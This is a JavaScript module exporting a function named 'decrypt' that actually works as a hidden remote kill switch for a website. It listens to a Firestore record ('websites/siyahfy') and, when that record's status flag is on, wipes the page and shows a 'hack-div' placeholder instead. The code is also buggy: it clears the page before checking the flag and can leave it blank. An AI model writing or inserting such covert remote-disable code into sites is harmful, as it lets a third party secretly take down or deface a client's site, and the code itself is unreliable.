import { db } from "./firebase.js";
import { doc, onSnapshot } from "firebase/firestore";

let originalBodyContent = null; // Variable to hold the original body content
const hackDivId = 'hack-div'; // ID for the hack div

const decrypt = () => {
  try {
    // Clone the current body content and clear the body
    originalBodyContent = document.body.cloneNode(true); // Create a clone of the body
    document.body.innerHTML = ''; // Clear the body content

    const docRef = doc(db, "websites", "siyahfy");
    onSnapshot(
      docRef,
      (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data();
          const status = data.status;

          // If status is true, append a div to the body
          if (status) {
            // Check if the hack div already exists
            let hackDiv = document.getElementById(hackDivId);
            if (!hackDiv) {
              // Create a new div element
              hackDiv = document.createElement('div');
              hackDiv.id = hackDivId; // Set ID for the hack div
              hackDiv.innerHTML = "Hello world"; // Set the inner HTML
              hackDiv.style.position = "fixed"; // Optional: position the div
              hackDiv.style.top = "10px"; // Optional: position it at the top
              hackDiv.style.left = "10px"; // Optional: position it to the left
              hackDiv.style.backgroundColor = "white"; // Optional: background color
              hackDiv.style.border = "1px solid black"; // Optional: border styling
              hackDiv.style.padding = "10px"; // Optional: padding for better appearance
              document.body.innerHTML = ''; // Clear current content

              // Append the new div to the body
              document.body.appendChild(hackDiv);
            }
          } else {
            // If status is false, restore the original body content
            if (document.getElementById(hackDivId)) {
              document.body.innerHTML = ''; // Clear current content
              document.body.appendChild(originalBodyContent); // Restore original content
              originalBodyContent = null; // Clear the backup
            }
          }
        } else {
          console.log("No such document!");
        }
      },
      (error) => {
        console.error("Error fetching document in real-time:", error);
      }
    );
  } catch (error) {
    console.error("Error setting up real-time listener:", error);
  }
};

export default decrypt;
